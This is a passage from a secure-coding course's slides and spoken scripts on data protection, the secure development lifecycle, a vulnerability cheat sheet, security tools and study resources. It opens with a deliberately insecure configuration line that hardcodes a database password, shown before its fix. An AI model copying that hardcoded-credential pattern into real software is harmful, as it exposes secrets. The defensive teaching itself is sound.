spring.datasource.password=MyRealPassword123

# ✅ Reference environment variable
spring.datasource.password=${DB_PASSWORD}
✅ Data Protection Checklist:

Classify all data — know what's sensitive
Enforce TLS/HTTPS everywhere — no exceptions
Encrypt sensitive data at rest (AES-256)
Use strong, current algorithms only (AES, RSA-2048+, SHA-256+)
Use a secrets manager (HashiCorp Vault, AWS Secrets Manager)
Add .env and *.properties to .gitignore
Minimize retention — don't store what you don't need


SCRIPT (~3 minutes)
"Let's cover the concrete defenses for sensitive data exposure.
HTTPS everywhere — non-negotiable. Spring Security can enforce this with a one-liner that redirects any HTTP request to HTTPS. Use it. Get a TLS certificate — Let's Encrypt provides them free. Configure your server for TLS 1.2 minimum, preferably TLS 1.3. Disable old protocol versions like SSL 3.0 and TLS 1.0 which have known vulnerabilities.
Secrets management is critical and something the industry has gotten much better tooling around. In development, use environment variables so secrets aren't in your codebase. In production, use a dedicated secrets manager like HashiCorp Vault, AWS Secrets Manager, or Azure Key Vault. These systems store secrets encrypted, control and audit who accesses them, and can rotate them automatically. Your application retrieves secrets at startup rather than having them baked in.
Your .gitignore file should always include your .env files and local properties files that might contain credentials. Better yet, never put actual secrets in those files at all — use variable references. And do a git history scan with a tool like git-secrets or truffleHog periodically to check that no secrets have been accidentally committed.
For data at rest, if you're storing genuinely sensitive data — health records, financial information — encrypt it at the database level or application level using AES-256. Even if an attacker gets your database files directly, they can't read the data without the encryption key. Use current, vetted cryptographic libraries — never roll your own crypto. Java's standard library has good implementations, and libraries like Bouncy Castle are well-audited options for advanced needs.
Minimize what you store. Data you don't have can't be stolen. If your application doesn't need to know a user's full credit card number after processing a payment — and in most cases it doesn't — don't store it."


SLIDE 21: Applying Secure Coding Practices – Putting It All Together
Slide Content:
The Secure Developer's Mindset:

Think like an attacker — ask "how would I abuse this?"
Every input is hostile until proven otherwise
Every output must be encoded for its context
Every privilege must be justified
Every secret must be external and protected
Every dependency must be tracked and updated

The Secure Development Lifecycle (SDL):

Design — Threat modeling, security requirements
Develop — Secure coding standards, peer review
Test — SAST, DAST, penetration testing
Deploy — Security configuration review, secrets management
Operate — Monitoring, patch management, incident response


SCRIPT (~2 minutes)
"Everything we've covered today comes down to one mental shift: thinking like an attacker while you write code.
When you write a form handler, ask: what happens if someone submits a script tag as their name? When you write a database query, ask: what happens if someone puts SQL commands in this input? When you write an API endpoint, ask: what should happen if an unauthenticated user calls this? If an unauthorized user calls this? What if someone calls it a thousand times a second?
The secure development lifecycle formalizes this thinking across the entire project. At design time, you do threat modeling — you draw your system architecture and you ask: where does data enter? Where does it leave? Who touches it? What are the trust boundaries? Thinking through these questions at design time costs almost nothing and prevents vulnerabilities that are expensive to fix later.
During development, you apply the secure coding practices we've discussed, you do code reviews with security specifically in mind, and you use static analysis tools that can automatically identify patterns like string concatenation in SQL queries.
During testing, you use both automated tools — SAST scans your source code, DAST attacks your running application — and manual penetration testing for high-value systems.
In deployment and operations, you enforce security configuration, manage secrets properly, monitor for anomalies, and maintain a process for rapidly patching vulnerabilities when they're discovered."


SLIDE 22: Quick Reference – Vulnerability Prevention Cheat Sheet
Slide Content:
VulnerabilityRoot CausePrimary PreventionSQL InjectionConcatenated user input in SQLParameterized queriesCommand InjectionConcatenated user input in OS commandsAvoid shell calls; use ProcessBuilder with arraysXSSUser input rendered as HTML without encodingOutput encoding; CSP headerCSRFState-changing requests lack origin verificationCSRF tokens; SameSite cookiesBroken AuthWeak passwords, session mismanagementBCrypt; session regeneration; MFASecurity MisconfigurationInsecure defaults; missing headersHarden config; disable unused features; patchSensitive Data ExposureUnencrypted data; secrets in codeHTTPS; AES-256; secrets manager

SCRIPT (~1 minute)
"Here's your cheat sheet — the one-line summary of each vulnerability we covered today, its root cause, and the primary prevention. Screenshot this, print it out, put it on your wall. These are the seven things you are now responsible for preventing in any code you write from today forward.
Notice a theme across almost all of them: trust nothing from outside, use your frameworks correctly, and configure your systems deliberately. These aren't exotic techniques — they're disciplined application of tools and practices that exist exactly for these problems."


SLIDE 23: Tools Every Secure Developer Should Know
Slide Content:
Static Analysis (SAST) — scans source code:

SpotBugs + FindSecBugs plugin — Java static analysis
SonarQube — code quality and security scanning
Checkmarx, Veracode — enterprise SAST

Dynamic Analysis (DAST) — attacks running application:

OWASP ZAP (Zed Attack Proxy) — free, powerful, industry standard
Burp Suite — professional web application security testing

Dependency Scanning:

OWASP Dependency-Check — scans for known CVEs in your libraries
Snyk — developer-friendly dependency and container scanning

Secrets Scanning:

git-secrets, truffleHog — scan repos for accidentally committed credentials

Reference:

OWASP Cheat Sheet Series — owasp.org/www-project-cheat-sheets
NIST National Vulnerability Database — nvd.nist.gov


SCRIPT (~2 minutes)
"Let's end with the tools that belong in your toolkit. You don't just identify vulnerabilities with your eyes — you use automated tooling to systematically find issues at scale.
OWASP ZAP is free, open-source, and is the standard starting point for dynamic security testing. It acts as a proxy between your browser and your application, intercepts every request and response, and can automatically scan for common vulnerabilities. Learn to use it. Burp Suite is the professional choice and is industry-standard for penetration testers.
SpotBugs with the FindSecBugs plugin statically analyzes your Java bytecode and flags security-relevant patterns — things like SQL concatenation, insecure random number generation, hardcoded credentials. It can be integrated into your Maven or Gradle build. SonarQube extends this with a comprehensive platform that tracks issues over time.
OWASP Dependency-Check scans your project dependencies against the National Vulnerability Database and tells you if any of your libraries have known CVEs. This is how you catch the 'Vulnerable and Outdated Components' item from the Top 10 — run this in your CI/CD pipeline.
And bookmark the OWASP Cheat Sheet Series at owasp.org. For every single vulnerability category we discussed today, there is a detailed, practical cheat sheet with code examples and configuration guidance. It is one of the most valuable free resources in application security."


SLIDE 24: Summary and Key Takeaways
Slide Content:
What we covered today:

Secure coding principles: Defense in depth, least privilege, fail securely, never trust input
OWASP Top 10 — the industry-standard security baseline
Injection: Parameterized queries stop SQL and command injection
Broken Authentication: BCrypt for passwords, proper session management, MFA
XSS: Output encoding + Content Security Policy
CSRF: CSRF tokens + SameSite cookies
Security Misconfiguration: Harden defaults, security headers, patch management
Sensitive Data Exposure: HTTPS everywhere, secrets management, strong crypto

Your responsibilities as a developer:

Validate all input
Encode all output
Authenticate and authorize every request
Protect every secret
Patch every dependency


SCRIPT (~2 minutes)
"Let's bring it home. Today we walked through the core secure coding principles and then applied them to six major vulnerability categories that together account for the majority of real-world web application breaches.
The through-line across everything we covered is this: attackers exploit the gap between what your code assumes and what users actually send. They send SQL commands when you expected a name. They send script tags when you expected a comment. They make requests to your server when you expected only your own forms to do so. Close those gaps by validating everything, encoding everything for context, and configuring everything deliberately.
Your five responsibilities as a developer: validate all input, encode all output, authenticate and authorize every request, protect every secret, patch every dependency. If you do these five things consistently, you will be significantly more secure than the average application on the internet.
We'll build on everything from today in upcoming sessions — we'll get deeper into access control, logging and monitoring, dependency management, and practical penetration testing techniques. Start looking at your existing code and projects with the lens we developed today. Ask yourself: where is user input being used? Is it validated? Is it parameterized? Is it encoded before output? You'll find things. That's the point.
Any questions before we wrap up?"


SLIDE 25: Resources and Further Study
Slide Content:
Essential References:

OWASP Top 10: owasp.org/www-project-top-ten
OWASP Cheat Sheet Series: cheatsheetseries.owasp.org
OWASP Testing Guide: owasp.org/www-project-web-security-testing-guide
NIST Cybersecurity Framework: nist.gov/cyberframework
Spring Security Reference: docs.spring.io/spring-security

Practice Environments (deliberately vulnerable apps):

OWASP WebGoat — Java-based, intentionally vulnerable app
OWASP Juice Shop — Node.js, modern vulnerabilities
DVWA (Damn Vulnerable Web Application)

Certifications for Further Learning:

OWASP-aligned: CompTIA Security+, CEH
Professional: OSCP (Offensive Security Certified Professional)

"The best way to understand how to defend is to learn how to attack — safely, in lab environments"

SCRIPT (~1 minute)
"These are your resources. OWASP's website is the first place you should go for any security question — the cheat sheet series in particular is something I recommend you bookmark and use regularly. WebGoat and Juice Shop are intentionally vulnerable applications built specifically for practicing exploitation and remediation in a safe environment. I strongly encourage you to set them up locally and work through their exercises — there is no better way to understand a SQL injection defense than to successfully perform a SQL injection attack in a lab environment first.

---

